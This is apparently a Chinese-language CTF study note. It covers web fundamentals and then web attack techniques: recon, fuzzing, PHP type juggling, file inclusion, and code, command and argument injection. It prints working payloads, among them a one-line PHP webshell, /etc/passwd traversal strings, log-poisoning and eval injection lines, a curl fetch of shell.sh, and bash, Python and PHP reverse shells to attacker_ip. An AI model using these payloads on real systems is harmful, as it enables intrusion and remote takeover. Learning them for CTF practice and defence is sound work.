## 1. Web
Web（World Wide Web）是建立在網際網路（Internet）上的資訊系統，由瀏覽器（Client）與伺服器（Server）進行互動，透過 HTTP 協議傳遞資料。

### 基本結構
- Client（用戶端）：如 Chrome，發出請求、接收與呈現網頁內容。
- Server（伺服器）**：如 Apache/Nginx，接收請求、回傳 HTML/CSS/JS 等資源。
- HTTP(S)：資料傳輸協定，常見動作為 GET / POST。
- 網址（URL）：資源定位方式，如 `https://example.com/index.html`。

### 一次瀏覽器請求的流程：
1. 使用者輸入網址
2. DNS 查詢網址對應 IP
3. 與伺服器建立連線（TCP / TLS）
4. 發出 HTTP 請求（如 GET）
5. 接收伺服器回應的 HTML / CSS / JS
6. 呈現在瀏覽器畫面中


### 前端基礎

#### HTML
- 網頁的基本骨架，使用標籤（tag）來結構化內容。
```html
<h1>Hello JYC</h1>
<a href='flag.txt'>點我</a>
```

#### CSS
- 控制樣式（顏色、大小、位置）。
```css
body {
  background-color: black;
  color: #00ff00;
}
```

#### JavaScript
- 網頁的邏輯與互動語言，可控制 DOM、處理事件、操作 Cookie。
```javascript
document.cookie = 'jyc_token=1234';
alert('Hello from JS');
```

---

### Cookie 機制與應用

#### 什麼是 Cookie？
- Cookie 是瀏覽器儲存在本機的小型資料，常用於記憶登入狀態或使用者偏好。

#### 常見應用
- 登入驗證（token）
- 記住登入帳號
- 購物車資訊保存

#### Cookie 工具
- document.cookie：用 JS 存取 cookie
- 開發者工具 (F12) $\rightarrow$ Application $\rightarrow$ Cookies
- 修改 Cookie $\rightarrow$ 嘗試 Bypass 權限驗證

[Cookie-Editor](https://cookie-editor.com/)

---

### 雜湊（Hash）

#### Hash 是什麼？
- 將任意長度的資料輸入，輸出固定長度的不可逆字串，常用於密碼加密、完整性驗證。

#### 常見 Hash 演算法：
- MD5（128 位元，容易碰撞）
- SHA1（160 位元，也已不安全）
- SHA256 / SHA3（目前安全性較高）
```python
import hashlib

passwd = '1234'
print(hashlib.md5(passwd.encode()).hexdigest())  # e.g. '81dc9bdb52d04dc20036dbd8313ed055'
```

#### Hash 碰撞（Collision）
- 不同輸入產生相同輸出。CTF 題中可能用來繞過雜湊比對。

[SHA1](https://shattered.io/)

[MD5](https://www.mscs.dal.ca/~selinger/md5collision/)

---

### 工具

#### F12 開發者工具（DevTools）
- Elements：查看 HTML 結構，編輯前端內容
- Console：輸入 JavaScript 測試操作
- Network：觀察請求與回應 headers / cookies / status
- Application：查看 Cookie、LocalStorage、SessionStorage

#### curl（命令列發送 HTTP 請求）
```bash
curl http://example.com
curl -X POST -d 'user=admin&pass=1234' http://target.com/login
curl -b 'admin=1' http://target.com/panel
```

#### [Cheatsheet](https://github.com/w181496/Web-CTF-Cheatsheet)
#### [Wappalyzer](https://www.wappalyzer.com/)

---

## 2. Web Security

### 解題三階段：Recon → Fuzz → Attack

#### Recon（偵察）

- 確認網站結構（robots.txt、路徑、隱藏檔案）
- 嘗試子域名列舉、備份檔案、Git 洩漏、錯誤訊息
- 觀察網址參數、Cookie、HTTP Header 等輸入點

#### Fuzz（模糊測試）

- 嘗試特殊輸入值觀察回應（如 `?id='`, `%00`, `<script>`）
- 嘗試各種參數組合與字典爆破
- 改變請求方法與 headers

#### Attack（實際攻擊）

- 利用明確弱點執行攻擊（LFI、Webshell、SQLi、繞過）
- 撰寫腳本實作利用或爆破
- 觀察 flag 輸出點與系統回應

---

### 資訊洩漏與偵察技巧（Info Leak）

#### robots.txt

- 位置固定於網站根目錄：`/robots.txt`
- 用於指示搜尋引擎不索引哪些頁面
- 有時含有管理路徑或 flag 提示

```
http://target.com/robots.txt
```

#### .git 洩漏（Git Leak）

- 如果網站部署時未刪除 `.git` 目錄，可能被還原出原始碼
- 工具推薦：[GitHack](https://github.com/lijiejie/GitHack)

```bash
python GitHack.py http://www.target.com/.git/
```

#### Vim Swapfile 洩漏

- Vim 產生的 `.swp`, `.swo` 可能包含原始程式碼
- 嘗試讀取檔名加上 `.swp`：
```
http://target.com/index.php.swp
```

- 可用 `strings` 工具查看：
```bash
strings index.php.swp
```

#### 備份檔案 (.bak, .old, ~)

- 常見於開發時誤留的備份副檔名
- 嘗試加入以下副檔名：
```
index.php.bak
login.php.old
config.php~
```

#### Google Hacking（Dork）

- 使用搜尋引擎語法找出潛在可疑頁面
```
site:target.com intitle:index.of
site:target.com inurl:admin
filetype:log
```
---

### 工具輔助

#### ffuf（快速模糊測試）

```bash
ffuf -u http://target.com/FUZZ -w wordlist.txt
```

#### gobuster（路徑爆破）

```bash
gobuster dir -u http://target.com -w common.txt
```

#### 子域名工具

- [https://subdomainfinder.c99.nl/](https://subdomainfinder.c99.nl)

---

### 後端安全

#### Language Trick - PHP 弱型別繞過

PHP 的 `==` 會進行型別轉換，導致繞過驗證：

```php
if ($_GET['pass'] == '0') { // 'false' == 0 為 true
    echo 'Login success';
} # ?pass=false
```

#### Array Injection（參數陣列）

PHP 中 `name[]=x&name[]=y` → 傳入 array，可導致邏輯錯誤：

```http
POST /login
username[]=admin&username[]=guest
```

#### Web 型態判斷（File vs Route）

| 類型 | 說明 |
|------|------|
| File 型 | URL 對應實際檔案（.php/.html） |
| Route 型 | 使用框架處理路由（Flask, Express） |

判斷方式：
- 看 URL 是否以副檔名結尾
- 嘗試加入 `.php`、或修改路由參數觀察錯誤格式

---

#### Webshell

若可上傳 `.php` 檔，最簡 shell：

```php
<?php system($_GET['cmd']); ?>
```

副檔名繞過技巧：
- `.php.jpg`
- `.phtml`
- 修改 Content-Type: `application/x-php`

#### Path Traversal

嘗試跳目錄讀檔：

```
/view.php?file=../../../../etc/passwd
```

#### Arbitrary File Read

若檔名可控，嘗試讀任意檔案或程式碼：

```
/read?file=../../../config.php
```

#### LFI（Local File Inclusion）

載入本地檔案的漏洞，搭配可控參數：

```
/?file=../../etc/passwd
```

#### PHP 偽協議與解析

PHP 支援以下特殊路徑，可用於繞過或讀檔：

- `php://filter/convert.base64-encode/resource=xxx`
- `php://input` → 可利用 POST 傳送內容
- `data://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOz8+`

```
?file=php://filter/read=convert.base64-encode/resource=index.php
```

#### LFI to RCE 技巧

##### Log Poisoning

- 嘗試寫入 apache log，並從 `/var/log/apache2/access.log` 包含執行

```bash
curl -A "<?php system($_GET['cmd']); ?>" http://target.com
http://target.com/index.php?file=/var/log/apache2/access.log&cmd=id
```

### Injection

####  Code Injection
- 定義與原理：將使用者輸入直接當作程式的一部分執行，造成未預期邏輯或任意代碼執行。

常見於：`eval()`、`exec()`、`system()`、`new Function()` 等可執行字串內容的情境。

- CTF 判斷技巧
	- 輸入特定字符會導致語法錯誤
	- 可嘗試 `1+1`, `'jyc'.__class__`, `__import__`
	- 回傳結果有變動代表程式有運行輸入內容

```python
@app.route('/code')
def code():
    return eval(request.args.get('input'))
```

URL 測試：

```
http://target.com/code?input=1+1
http://target.com/code?input=__import__('os').system('ls')
```

_ 常見繞過技巧
	- 利用 `__class__`、`__subclasses__()` 等隱藏物件繞過
	- 用 `chr()` 組字串規避字元限制
	- 使用 base64 encode 再 `eval(base64.b64decode(...))`

---

#### Command Injection
- 定義與原理：將使用者輸入當作系統命令的一部分執行，導致任意系統指令可被注入執行。

常見於：`os.system()`, `popen()`, `exec()`, `shell_exec()` 等。

- CTF 判斷技巧
	- 輸入 `;ls`, `|id`, `&&whoami` 有回傳表示命令被執行
	- 錯誤訊息含 `sh`, `bash`, `command not found`

```
http://target.com/ping?host=127.0.0.1;id
http://target.com/?cmd=whoami
```

嘗試特殊符號：

- `;`, `|`, `&&`, `||`, `$()`, `\` 等

- 常見繞過技巧
	- 用 URL encode 繞過：`%26%26id`
	- 多層編碼、大小寫、空格繞過
	- 善用 `$IFS`：空格繞過 `curl$IFShttp://jyc.com/shell.sh`

---

#### Argument Injection
- 定義與原理：透過控制指令中的參數內容，使程式執行出乎預期的指令邏輯。

常見於：傳入 CLI 工具、Shell script、系統命令參數時未驗證。

- CTF 判斷技巧
	- 傳入類似 `--help`, `-v`, `;` 後回傳錯誤或資訊
	- 發現目標與 CLI 工具有關（如 zip, curl, grep）

```
curl -X POST -d 'file=--help' http://target.com/zip
```

或：

```
file=../../../../etc/passwd;--option
```

- 常見繞過技巧
	- 混合 CLI 與路徑組合如 `-R`, `-o output.txt`
	- 與 Command Injection 組合繞過輸出控制

---

#### Reverse Shell
- 定義與原理：讓目標主機主動連線回攻擊者的 IP，將 shell 權限導回來控制。

用於：已能執行命令或檔案上傳的情況，需進一步取得互動式 shell。

- 常見用途情境
	- Webshell 建立後進一步取得權限
	- RCE 無法看輸出 → 透過反彈取得實時 shell
	- Bypassing 防火牆 → 透過主動連回避入站封鎖

```bash
bash -i >& /dev/tcp/attacker_ip/1234 0>&1
```

```python
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("attacker_ip",1234));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
```

```php
<?php system("bash -c 'bash -i >& /dev/tcp/attacker_ip/1234 0>&1'"); ?>
```

- 備註工具
	- 攻擊端用 `nc -lvnp 1234` 傾聽
	- 若反彈不穩可轉接 `socat`, `ngrok`, `chisel`

---

